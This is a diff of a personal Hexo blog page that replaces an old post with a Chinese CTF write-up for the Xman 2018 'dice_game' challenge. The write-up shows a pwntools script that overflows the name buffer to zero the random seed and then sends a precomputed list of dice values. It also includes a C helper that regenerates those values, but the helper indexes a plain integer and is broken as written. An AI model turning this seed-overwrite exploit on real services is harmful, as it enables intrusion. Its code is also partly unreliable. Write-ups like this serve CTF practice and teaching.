@@ -4,12 +4,12 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>ccz | Hexo</title>
+    <title>Xman选拔赛2018-Xman-dice_game | Hexo</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
     
     <meta name="author" content="Lometsj">
     
-    <meta name="description" content="这是一个关于ccz的计划早年我在初中的时候特别喜欢暗荣出品的&amp;lt;&amp;lt;曹操传&amp;gt;&amp;gt;,同时也在cczmod的圈子活动了一段时间.当然,这个圈子人越来越少,轩辕也时常无法访问.我决定上线一个ccz wiki,作为一个时代的记录吧.">
+    <meta name="description" content="输入姓名时存在栈溢出覆盖时间种子,编写c程序重放随机数,按序填入即可过关.12345678910111213from pwn import *import randomcontext.log_level = &#39;debug&#39;#io = process(&#39;./dice_game&#39;)io = remote">
     
     
     
@@ -67,15 +67,15 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/posts/4bd00c2d/" title="ccz" itemprop="url">ccz</a>
+      <a href="/posts/a7fbebed/" title="Xman选拔赛2018-Xman-dice_game" itemprop="url">Xman选拔赛2018-Xman-dice_game</a>
   </h1>
   <p class="article-author">By
     
       <a href="http://lometsj.com" title="Lometsj">Lometsj</a>
     </p>
   <p class="article-time">
-    <time datetime="2018-07-16T05:01:09.000Z" itemprop="datePublished">2018-07-16</time>
-    Updated:<time datetime="2018-07-16T06:50:27.608Z" itemprop="dateModified">2018-07-16</time>
+    <time datetime="2018-07-16T07:03:58.000Z" itemprop="datePublished">2018-07-16</time>
+    Updated:<time datetime="2018-07-16T07:07:05.658Z" itemprop="dateModified">2018-07-16</time>
     
   </p>
 </header>
@@ -84,11 +84,11 @@
 		
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
-		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#这是一个关于ccz的计划"><span class="toc-number">1.</span> <span class="toc-text">这是一个关于ccz的计划</span></a></li></ol>
+		
 		</div>
 		
-		<h1 id="这是一个关于ccz的计划"><a href="#这是一个关于ccz的计划" class="headerlink" title="这是一个关于ccz的计划"></a>这是一个关于ccz的计划</h1><p>早年我在初中的时候特别喜欢暗荣出品的&lt;&lt;曹操传&gt;&gt;,同时也在cczmod的圈子活动了一段时间.<br>当然,这个圈子人越来越少,轩辕也时常无法访问.<br>我决定上线一个ccz wiki,作为一个时代的记录吧.</p>
-  
+		<p>输入姓名时存在栈溢出<br>覆盖时间种子,编写c程序重放随机数,按序填入即可过关.<br><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> random</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="comment">#io = process('./dice_game')</span></div><div class="line">io = remote(<span class="string">'47.96.239.28'</span>,<span class="number">9999</span>)</div><div class="line">io.recv()</div><div class="line">io.send(<span class="number">0x40</span> * <span class="string">'a'</span> + p32(<span class="number">0x0</span>))</div><div class="line">io.recv()</div><div class="line">pay = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">1</span>]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pay:</div><div class="line">	io.sendline(str(i))</div><div class="line">	io.recv()</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">cc</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> ss = <span class="number">0</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>,ss[<span class="number">0</span>]); </div><div class="line">	srand(ss[<span class="number">0</span>]);</div><div class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">50</span>;i++)</div><div class="line">    &#123;</div><div class="line">       <span class="built_in">printf</span>(<span class="string">"%u,"</span>,rand()%<span class="number">6</span>+<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>  
 	</div>
 		<footer class="article-footer clearfix">
 
@@ -97,7 +97,7 @@
 
 <div class="article-share" id="share">
 
-  <div data-url="http://lometsj.com/posts/4bd00c2d/" data-title="ccz | Hexo" data-tsina="" class="share clearfix">
+  <div data-url="http://lometsj.com/posts/a7fbebed/" data-title="Xman选拔赛2018-Xman-dice_game | Hexo" data-tsina="" class="share clearfix">
   </div>
 
 </div>
@@ -107,18 +107,18 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/posts/f500597a/" title="ciscn2018半决赛-mirage_game">
+ <a href="/posts/3fbf4b43/" title="Xman选拔赛2018-Xman-stack2">
   <strong>PREVIOUS:</strong><br/>
   <span>
-  ciscn2018半决赛-mirage_game</span>
+  Xman选拔赛2018-Xman-stack2</span>
 </a>
 </div>
 
 
 <div class="next">
-<a href="/posts/d8d4b91c/"  title="ALICTF 2016 vss">
+<a href="/posts/6a17cd88/"  title="defcon2015-r0pbaby">
  <strong>NEXT:</strong><br/> 
- <span>ALICTF 2016 vss
+ <span>defcon2015-r0pbaby
 </span>
 </a>
 </div>
@@ -131,7 +131,7 @@
 
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
-  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#这是一个关于ccz的计划"><span class="toc-number">1.</span> <span class="toc-text">这是一个关于ccz的计划</span></a></li></ol>
+  
   </div>
 
 <div id="asidepart">
